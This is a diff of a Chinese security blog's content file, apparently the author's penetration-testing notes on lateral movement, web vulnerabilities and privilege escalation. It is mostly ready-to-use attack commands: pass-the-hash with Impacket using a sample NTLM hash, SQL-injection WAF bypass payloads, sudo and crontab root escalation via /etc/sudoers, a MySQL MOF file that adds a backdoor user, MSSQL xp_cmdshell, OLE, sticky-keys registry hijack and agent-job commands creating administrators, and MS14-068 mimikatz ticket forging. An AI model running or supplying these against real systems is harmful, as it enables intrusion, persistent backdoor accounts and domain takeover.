+<h1 id="dcom"><a href="#dcom" class="headerlink" title="dcom"></a>dcom</h1><p>DCOM（分布式组件对象模型）是微软的一系列概念和程序接口</p>
+<p>Impacket 的dcomexec.py</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">python dcomexec.py .&#x2F;Administrator:123456@192.168.119.100</span><br></pre></td></tr></table></figure>
+
+
+
+
+
+<h1 id="PTH"><a href="#PTH" class="headerlink" title="PTH"></a>PTH</h1><p>基于NTML hash认证  (windows认证方式)</p>
 <p>psexec.py </p>
 <figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">python3 psexec.py -hashes aad3b435b51404eeaad3b435b51404ee:cd243e1e171da2c4edd1dd695bfbef5a shmily.god&#x2F;Administrator@192.168.119.100</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">python3 psexec.py shmily.god&#x2F;administrator:admin123...\!@192.168.119.100</span><br></pre></td></tr></table></figure>
 
@@ -2284,7 +2552,11 @@
   <entry>
     <title>基础web漏洞总结</title>
     <url>/2022/03/14/%E5%9F%BA%E7%A1%80web%E6%BC%8F%E6%B4%9E%E6%80%BB%E7%BB%93/</url>
-    <content><![CDATA[<h1 id="sql"><a href="#sql" class="headerlink" title="sql"></a>sql</h1><p>简单来说就是传参过滤不严谨照成sql语句的拼接</p>
+    <content><![CDATA[<h1 id="同源策略"><a href="#同源策略" class="headerlink" title="同源策略"></a>同源策略</h1><p>同协议同域名同端口的网站才能进行资源的获取和共享。</p>
+<h3 id="jsonp-劫持"><a href="#jsonp-劫持" class="headerlink" title="jsonp  劫持"></a>jsonp  劫持</h3><p><a href="http://wjlshare.com/archives/1319">JSONP劫持漏洞学习笔记(待补充) – 天下大木头 (wjlshare.com)</a></p>
+<p>利用<code>&lt;script&gt;</code>标签</p>
+<h3 id="core"><a href="#core" class="headerlink" title="core"></a>core</h3><p>利用Origin头</p>
+<h1 id="sql"><a href="#sql" class="headerlink" title="sql"></a>sql</h1><p>简单来说就是传参过滤不严谨照成sql语句的拼接</p>
 <figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="variable">$id</span>  = <span class="variable">$_GET</span>[<span class="string">&#x27;id&#x27;</span>];</span><br><span class="line"><span class="variable">$sql</span> = <span class="string">&quot;SELECT name FROM users WHERE id = <span class="subst">$id</span>&quot;</span>;</span><br></pre></td></tr></table></figure>
 
 
@@ -2294,19 +2566,18 @@
 
 
 
-<h3 id="常见基础绕过"><a href="#常见基础绕过" class="headerlink" title="常见基础绕过"></a>常见基础绕过</h3><h3 id="防御"><a href="#防御" class="headerlink" title="防御"></a>防御</h3><ul>
-<li>预编译</li>
-</ul>
-<ul>
-<li>PDO</li>
-</ul>
-<p>防止了sql语句的拼接</p>
-<ul>
-<li>正则规则</li>
-</ul>
+<h3 id="常见基础绕过"><a href="#常见基础绕过" class="headerlink" title="常见基础绕过"></a>常见基础绕过</h3><p>绕过空格</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">%20</span><br><span class="line">+</span><br><span class="line">&#x2F;**&#x2F;</span><br><span class="line">()</span><br><span class="line">&#x2F;*!%23xxxx%%0a*&#x2F;</span><br><span class="line">%23c%0a</span><br></pre></td></tr></table></figure>
+
+<p>关键字绕过</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">大小写&#x2F;双写</span><br><span class="line">&#x2F;*!select*&#x2F;</span><br><span class="line">&#x2F;*!50000select*&#x2F;            50000不行可以fuzz其他的数字试试，小于当前mysql版本号就行，能使用</span><br><span class="line">sel&#x2F;**&#x2F;ect</span><br><span class="line"></span><br><span class="line">%23 -&gt;#</span><br><span class="line">%0a -&gt;换行</span><br><span class="line"></span><br><span class="line">结合：</span><br><span class="line">select *from &#x2F;*!%23xxxxx%0a*&#x2F;users;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">绕安全狗（https:&#x2F;&#x2F;mp.weixin.qq.com&#x2F;s&#x2F;eva6L_zQx79GTWCDvfT7zg）</span><br><span class="line">select</span><br><span class="line">&#x2F;*!50000%53elect*&#x2F;</span><br><span class="line">order </span><br><span class="line"> &#x2F;*!50000%6frder*&#x2F;</span><br><span class="line">union</span><br><span class="line">&#x2F;*!50000%75nion*&#x2F;   </span><br><span class="line"></span><br><span class="line"></span><br><span class="line">from</span><br><span class="line">&#x2F;*!%23xxxx%%0afrom*&#x2F;</span><br><span class="line"></span><br><span class="line">database()</span><br><span class="line"></span><br><span class="line">database&#x2F;*!%23xxxx%0a*&#x2F;()</span><br></pre></td></tr></table></figure>
+
+<p>注释</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">--+www</span><br><span class="line">-- www</span><br><span class="line">#</span><br></pre></td></tr></table></figure>
+
+
+
 <h1 id="xss"><a href="#xss" class="headerlink" title="xss"></a>xss</h1><h3 id="bypass收藏语句"><a href="#bypass收藏语句" class="headerlink" title="bypass收藏语句"></a>bypass收藏语句</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line"></span><br></pre></td></tr></table></figure>
-
-
 
 
 
@@ -2325,9 +2596,9 @@
 <p>AddType application/ x-httpd-php .jpg</p>
 <figure class="highlight plain"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line">&#96;.user.ini &#96; (nginx&#x2F;apache&#x2F;IIS中支持fastcgi的都可以用)  </span><br><span class="line"></span><br></pre></td></tr></table></figure>
 <p>auto_prepend_file=test.jpg   # 在页面顶部加载文件    （类似于在文件前调用了require()函数包含test.jpg）       </p>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">### bypass</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">参考：</span><br><span class="line"></span><br><span class="line">https:&#x2F;&#x2F;xz.aliyun.com&#x2F;t&#x2F;10459</span><br><span class="line"></span><br><span class="line">https:&#x2F;&#x2F;xz.aliyun.com&#x2F;t&#x2F;10515</span><br><span class="line"></span><br><span class="line">### tips</span><br><span class="line"></span><br><span class="line">+ 条件竞争</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"># csrf</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"># ssrf</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">### 常用协议：</span><br><span class="line"></span><br><span class="line">file，dict，gopher，dns</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">### ssrf+redis</span><br><span class="line"></span><br><span class="line">1. 主从复制</span><br><span class="line">2. 计划任务</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">---</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"># 网站源码备份</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">### bypass</span><br><span class="line"></span><br><span class="line">参考：</span><br><span class="line"></span><br><span class="line">https:&#x2F;&#x2F;xz.aliyun.com&#x2F;t&#x2F;10459</span><br><span class="line"></span><br><span class="line">https:&#x2F;&#x2F;xz.aliyun.com&#x2F;t&#x2F;10515</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">### disable_functions Bypass </span><br><span class="line"></span><br><span class="line">1. LD_PRELOAD </span><br><span class="line">2. 利用 Windows 系统组件 COM</span><br><span class="line">3. 蚁剑插件</span><br><span class="line"></span><br><span class="line">[bypass disable_function多种方法+实例 - 安全客，安全资讯平台 (anquanke.com)](https:&#x2F;&#x2F;www.anquanke.com&#x2F;post&#x2F;id&#x2F;208451)</span><br><span class="line"></span><br><span class="line">[干货 | 突破disable_functions限制执行命令·上 - 云+社区 - 腾讯云 (tencent.com)](https:&#x2F;&#x2F;cloud.tencent.com&#x2F;developer&#x2F;article&#x2F;1944125)</span><br><span class="line"></span><br><span class="line">[干货 | 突破disable_functions限制执行命令·下 - 云+社区 - 腾讯云 (tencent.com)](https:&#x2F;&#x2F;cloud.tencent.com&#x2F;developer&#x2F;article&#x2F;1944129)</span><br><span class="line"></span><br><span class="line">### tips</span><br><span class="line"></span><br><span class="line">+ 条件竞争</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"># csrf</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">referer</span><br><span class="line"></span><br><span class="line">token</span><br><span class="line"></span><br><span class="line"># ssrf</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">### 常用协议：</span><br><span class="line"></span><br><span class="line">file，dict，gopher，dns</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">### ssrf+redis</span><br><span class="line"></span><br><span class="line">1. 主从复制</span><br><span class="line">2. 计划任务</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">---</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"># 网站源码备份</span><br><span class="line"></span><br></pre></td></tr></table></figure>
 <p>cd /var/www/html<br>tar -zcvf ~/html.tar.gz *</p>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"># 脱库</span><br><span class="line"></span><br><span class="line">+ mysql</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"># 脱数据库</span><br><span class="line"></span><br><span class="line">+ mysql</span><br><span class="line"></span><br></pre></td></tr></table></figure>
 <p> mysqldump -u root -p –all-databases &gt; ~/backup.sql  # 备份所有数据库</p>
 <figure class="highlight plain"><table><tr><td class="code"><pre><span class="line"></span><br></pre></td></tr></table></figure>
 <p>在mysql/data/  中文件</p>
@@ -2461,6 +2732,7 @@
 <ol start="2">
 <li>RPC 135端口是否开启</li>
 </ol>
+<h3 id="其他tips："><a href="#其他tips：" class="headerlink" title="其他tips："></a>其他tips：</h3><p>（CVE-2022-29072）7zip漏洞 提权</p>
 <p>参考：</p>
 <p><a href="https://mp.weixin.qq.com/s/66y_Pg2j9CNfxeErFczdSg">https://mp.weixin.qq.com/s/66y_Pg2j9CNfxeErFczdSg</a></p>
 <p><a href="https://mp.weixin.qq.com/s/lmfM6VWM3YXj2vjalNerKw">https://mp.weixin.qq.com/s/lmfM6VWM3YXj2vjalNerKw</a></p>
@@ -2500,7 +2772,31 @@
 
 
 
-<h3 id="sudo"><a href="#sudo" class="headerlink" title="sudo"></a>sudo</h3><h3 id="计划任务"><a href="#计划任务" class="headerlink" title="计划任务"></a>计划任务</h3><p>参考：<a href="https://www.cnblogs.com/sfsec/p/15163907.html">https://www.cnblogs.com/sfsec/p/15163907.html</a></p>
+<h3 id="sudo"><a href="#sudo" class="headerlink" title="sudo"></a>sudo</h3><p>知道账户密码</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">sudo find . -exec &#x2F;bin&#x2F;sh \; -quit</span><br><span class="line"></span><br><span class="line">sudo python -c &#39;import pty;pty.spawn(&quot;&#x2F;bin&#x2F;bash&quot;)&#39;</span><br></pre></td></tr></table></figure>
+
+
+
+<p>漏洞</p>
+<h3 id="计划任务"><a href="#计划任务" class="headerlink" title="计划任务"></a>计划任务</h3><p>crontab提权</p>
+<ol>
+<li>编辑/etc/crontab，设置每隔1分钟执行一次sh脚本</li>
+</ol>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">*&#x2F;1 * * * * root sh &#x2F;home&#x2F;test&#x2F;test.sh &gt;&gt; &#x2F;tmp&#x2F;test.txt</span><br></pre></td></tr></table></figure>
+
+<ol start="2">
+<li>如果test用户有权限操作test.sh，则存在提权漏洞。下面使用test用户修改test.sh：将test用户加入sudoers</li>
+</ol>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">mv test.sh test.sh.bak</span><br><span class="line"></span><br><span class="line">vim test.sh                                                               echo &quot;test ALL&#x3D;(root) NOPASSWD: ALL&quot; &gt;&gt; &#x2F;etc&#x2F;sudoers</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<ol start="3">
+<li>等待1分钟后，成功提权</li>
+</ol>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">sudo su</span><br><span class="line"></span><br><span class="line">whoami</span><br></pre></td></tr></table></figure>
+
+
+
+<p>参考：<a href="https://www.cnblogs.com/sfsec/p/15163907.html">https://www.cnblogs.com/sfsec/p/15163907.html</a></p>
 <h1 id="mysql提权"><a href="#mysql提权" class="headerlink" title="mysql提权"></a>mysql提权</h1><h3 id="udf"><a href="#udf" class="headerlink" title="udf"></a>udf</h3><p>原理：</p>
 <figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">UDF是mysql的一个扩展接口，即扩展mysql的用户自定义函数。用户可以向mysql的udf.dll中添加用户自定义函数（可以执行命令的函数，如sys_eval（）），即可获得system权限。</span><br></pre></td></tr></table></figure>
 
@@ -2550,16 +2846,84 @@
 
 <p><img src="/2022/01/16/%E6%8F%90%E6%9D%83/65.png"></p>
 <p>成功获取system权限</p>
-<h3 id="mof"><a href="#mof" class="headerlink" title="mof"></a>mof</h3><h1 id="mssql提权"><a href="#mssql提权" class="headerlink" title="mssql提权"></a>mssql提权</h1><h3 id="xp-cmdshell"><a href="#xp-cmdshell" class="headerlink" title="xp_cmdshell"></a>xp_cmdshell</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">sp_configure &#39;show advanced options&#39;,1</span><br><span class="line">reconfigure</span><br><span class="line">go</span><br><span class="line">sp_configure &#39;xp_cmdshell&#39;,1</span><br><span class="line">reconfigure</span><br><span class="line">go</span><br><span class="line"></span><br><span class="line">EXEC xp_cmdshell &#39;whoami&#39;;</span><br></pre></td></tr></table></figure>
+<h3 id="mof"><a href="#mof" class="headerlink" title="mof"></a>mof</h3><p>原理：</p>
+<p>对c:/windows/system32/wbem/mof/ 目录下的 nullevt.mof 文件  具有读写权限，在nullevt.mof  中可以构造恶意vbs脚本（特性是每隔一段时间执行一次）进行命令执行 </p>
+<p>条件：</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">secure-file-priv参数不为null</span><br><span class="line">mysql启动身份具有权限去读写 c:&#x2F;windows&#x2F;system32&#x2F;wbem&#x2F;mof目录</span><br><span class="line">windows 03及以下版本</span><br></pre></td></tr></table></figure>
 
 
 
-<h1 id="域内提权"><a href="#域内提权" class="headerlink" title="域内提权"></a>域内提权</h1><h3 id="MS14-068"><a href="#MS14-068" class="headerlink" title="MS14-068"></a>MS14-068</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">前提条件：</span><br><span class="line"></span><br><span class="line">域控没有打该漏洞补丁(KB3011780)</span><br><span class="line"></span><br><span class="line">已经获取普通域用户的账户，密码，hash，sid（whoami &#x2F;user）</span><br></pre></td></tr></table></figure>
+<p>公开nullevt.mof 代码</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">#pragma namespace(&quot;\\\\.\\root\\subscription&quot;)</span><br><span class="line">instance of __EventFilter as $EventFilter</span><br><span class="line">&#123;</span><br><span class="line">EventNamespace &#x3D; &quot;Root\\Cimv2&quot;;</span><br><span class="line">Name &#x3D; &quot;filtP2&quot;;</span><br><span class="line">Query &#x3D; &quot;Select * From __InstanceModificationEvent &quot;</span><br><span class="line">&quot;Where TargetInstance Isa \&quot;Win32_LocalTime\&quot; &quot;</span><br><span class="line">&quot;And TargetInstance.Second &#x3D; 5&quot;;</span><br><span class="line">QueryLanguage &#x3D; &quot;WQL&quot;;</span><br><span class="line">&#125;;</span><br><span class="line">instance of ActiveScriptEventConsumer as $Consumer</span><br><span class="line">&#123;</span><br><span class="line">Name &#x3D; &quot;consPCSV2&quot;;</span><br><span class="line">ScriptingEngine &#x3D; &quot;JScript&quot;;</span><br><span class="line">ScriptText &#x3D;</span><br><span class="line">&quot;var WSH &#x3D; new ActiveXObject(\&quot;WScript.Shell\&quot;)\nWSH.run(\&quot;net.exe user shmily 123456 &#x2F;add\&quot;)&quot;;</span><br><span class="line">&#125;;</span><br><span class="line">instance of __FilterToConsumerBinding</span><br><span class="line">&#123;</span><br><span class="line">Consumer &#x3D; $Consumer;</span><br><span class="line">Filter &#x3D; $EventFilter;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
 
 
 
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">利用：</span><br><span class="line"></span><br><span class="line">1.mimikatz清除票据</span><br><span class="line">kerberos::purge</span><br><span class="line"></span><br><span class="line">2.ms14-068.exe生成票据</span><br><span class="line">MS14-068.exe -u &lt;userName&gt;@&lt;domainName&gt; -p &lt;clearPassword&gt; -s &lt;userSid&gt; -d &lt;domainControlerAddr(ip)&gt;</span><br><span class="line"></span><br><span class="line">3.mumukatz导入票据，权限提升为域管</span><br><span class="line">kerberos::ptc &quot;票据文件名&quot;</span><br></pre></td></tr></table></figure>
+<p>导入：</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">select load_file(&quot;C:&#x2F;phpStudy&#x2F;WWW&#x2F;upload&#x2F;1.mof&quot;) into dumpfile &quot;c:&#x2F;windows&#x2F;system32&#x2F;wbem&#x2F;mof&#x2F;nullevt.mof&quot;</span><br></pre></td></tr></table></figure>
 
+
+
+<h1 id="mssql提权"><a href="#mssql提权" class="headerlink" title="mssql提权"></a>mssql提权</h1><h3 id="xp-cmdshell"><a href="#xp-cmdshell" class="headerlink" title="xp_cmdshell"></a>xp_cmdshell</h3><p><code>xp_cmdshell</code>在<code>mssql2000</code>中是默认开启的，不过在<code>mssql2005</code>之后的版本中则是默认关闭的。</p>
+<p>查询xp_cmdshell是否存在</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">select count(*)from master.dbo.sysobjects where xtype &#x3D; &#39;x&#39; and name &#x3D; &#39;xp_cmdshell&#39; ;</span><br></pre></td></tr></table></figure>
+
+
+
+<p>启用<code>xp_cmdshell</code>命令  ，需要管理员SA权限，否在不能启动。</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">EXEC sp_configure &#39;show advanced options&#39;,1</span><br><span class="line">reconfigure</span><br><span class="line">go</span><br><span class="line">EXEC sp_configure &#39;xp_cmdshell&#39;,1</span><br><span class="line">reconfigure</span><br><span class="line">go</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p>提权</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">exec master..xp_cmdshell &#39;net user shmily 123. &#x2F;add&#39;</span><br></pre></td></tr></table></figure>
+
+
+
+<h3 id="sp-oacreate"><a href="#sp-oacreate" class="headerlink" title="sp_oacreate"></a>sp_oacreate</h3><p>xp_cmdshell被删除时候，sp_oacreate默认被禁止，需要开启。<code>sp_oacreate</code>在 <code>SQL Server</code>实例上创建<code>OLE</code>对象实例。</p>
+<p>恢复sp_oacreate</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">EXEC sp_configure &#39;show advanced options&#39;, 1;   </span><br><span class="line">RECONFIGURE WITH OVERRIDE;   </span><br><span class="line">EXEC sp_configure &#39;Ole Automation Procedures&#39;, 1;   </span><br><span class="line">RECONFIGURE WITH OVERRIDE;  </span><br></pre></td></tr></table></figure>
+
+<p>命令执行   -&gt;输出到c:\1.txt</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">declare @shell int exec sp_oacreate &#39;wscript.shell&#39;,@shell output exec sp_oamethod @shell,&#39;run&#39;,null,&#39;c:\windows\system32\cmd.exe &#x2F;c whoami &gt;c:\\1.txt&#39;;</span><br></pre></td></tr></table></figure>
+
+
+
+<h3 id="沙盒提权"><a href="#沙盒提权" class="headerlink" title="沙盒提权"></a>沙盒提权</h3><p>沙盒模式是数据库的一种安全功能.在沙盒模式下,只对控件和字段属性中的安全且不含恶意代码的表达式求值.如果表达式不使用可能以某种方式损坏数据的函数或属性，则可认为它是安全的.</p>
+<p><a href="http://alexsel.com/index.php/archives/80/">Mssql提权 - Cyberpunk (alexsel.com)</a></p>
+<h3 id="镜像劫持提权"><a href="#镜像劫持提权" class="headerlink" title="镜像劫持提权"></a>镜像劫持提权</h3><p>通过regwrite函数修改注册表进行，regwrite需要开启</p>
+<p>参考上面开启Ad Hoc Distributed，并恢复regwrite</p>
+<p>劫持</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">EXEC master..xp_regwrite @rootkey&#x3D;&#39;HKEY_LOCAL_MACHINE&#39;,@key&#x3D;&#39;SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\sethc.EXE&#39;,@value_name&#x3D;&#39;Debugger&#39;,@type&#x3D;&#39;REG_SZ&#39;,@value&#x3D;&#39;c:\windows\system32\cmd.exe&#39;</span><br></pre></td></tr></table></figure>
+
+<p>查看Debugger 是否为cmd路径</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">exec master..xp_regread &#39;HKEY_LOCAL_MACHINE&#39;,&#39;SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\sethc.exe&#39;,&#39;Debugger&#39;</span><br></pre></td></tr></table></figure>
+
+<p>然后远程桌面，五次shift</p>
+<h3 id="JOB提权"><a href="#JOB提权" class="headerlink" title="JOB提权"></a>JOB提权</h3><p>创建任务X，执行命令，返回结果</p>
+<p>启动sqlagent服务：</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">exec master.dbo.xp_servicecontrol &#39;start&#39;,&#39;SQLSERVERAGENT&#39;</span><br></pre></td></tr></table></figure>
+
+
+
+<p>创建任务x，执行添加账户的命令，然后将命令返回结果输出到<code>q.txt</code>中</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">use msdb</span><br><span class="line">exec sp_delete_job null,&#39;x&#39;</span><br><span class="line">exec sp_add_job &#39;x&#39;</span><br><span class="line">exec sp_add_jobstep null,&#39;x&#39;,null,&#39;1&#39;,&#39;cmdexec&#39;,&#39;cmd &#x2F;c &quot;net user test test &#x2F;add &amp;net localgroup administrators test &#x2F;add&gt;c:&#x2F;q.txt&quot;&#39;</span><br><span class="line">exec sp_add_jobserver null,&#39;x&#39;,@@servername</span><br><span class="line">exec sp_start_job &#39;x&#39;;</span><br></pre></td></tr></table></figure>
+
+
+
+<p>参考：</p>
+<p><a href="http://alexsel.com/index.php/archives/80/">Mssql提权 - Cyberpunk (alexsel.com)</a></p>
+<h1 id="域内提权"><a href="#域内提权" class="headerlink" title="域内提权"></a>域内提权</h1><h3 id="MS14-068"><a href="#MS14-068" class="headerlink" title="MS14-068"></a>MS14-068</h3><p>原理：PAC问题</p>
+<p>用户在向 Kerberos 密钥分发中心（KDC）申请TGT（由票据授权服务产生的身份凭证）时，可以伪造自己的 Kerberos 票据。</p>
+<p>如果票据声明自己有域管理员权限，而KDC在处理该票据时未验证票据的签名，那么，返给用户的TGT就使普通域用户拥有了域管理员权限。</p>
+<p>将TGT发送到KDC，KDC的TGS（票据授权服务）在验证了TGT后，将服务票据（Server Ticket）发送给该用户，而该用户拥有访问该服务的权限，从而使攻击者可以访问域内的资源。</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">前提条件：</span><br><span class="line"></span><br><span class="line">域控没有打该漏洞补丁(KB3011780)</span><br><span class="line"></span><br><span class="line">已经获取普通域用户的账户，密码，hash，sid（whoami &#x2F;user）</span><br></pre></td></tr></table></figure>
+
+
+
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">利用：</span><br><span class="line"></span><br><span class="line">1.mimikatz清除票据</span><br><span class="line">kerberos::purge</span><br><span class="line"></span><br><span class="line">2.ms14-068.exe生成票据</span><br><span class="line">MS14-068.exe -u &lt;userName&gt;@&lt;domainName&gt; -p &lt;clearPassword&gt; -s &lt;userSid&gt; -d &lt;domainControlerAddr(ip)&gt;</span><br><span class="line"></span><br><span class="line">-u   域用户@域控名  -p 域用户密码 -s 域用户sid -d 域ip</span><br><span class="line"></span><br><span class="line">3.mumukatz导入票据，权限提升为域管</span><br><span class="line">kerberos::ptc &quot;票据文件名&quot;</span><br></pre></td></tr></table></figure>
+
+
+
+<h3 id="CVE-2021-42287-CVE-2021-42278"><a href="#CVE-2021-42287-CVE-2021-42278" class="headerlink" title="CVE-2021-42287/CVE-2021-42278"></a>CVE-2021-42287/CVE-2021-42278</h3><p>即saMAccountName spoofing漏洞，仅有一个普通域账号的场景下，利用该漏洞接管全域。</p>
+<p><a href="https://www.freebuf.com/vuls/317773.html">域内提权漏洞CVE-2021-42287与CVE-2021-42278原理分析 - FreeBuf网络安全行业门户</a></p>
 ]]></content>
       <categories>
         <category>提权</category>
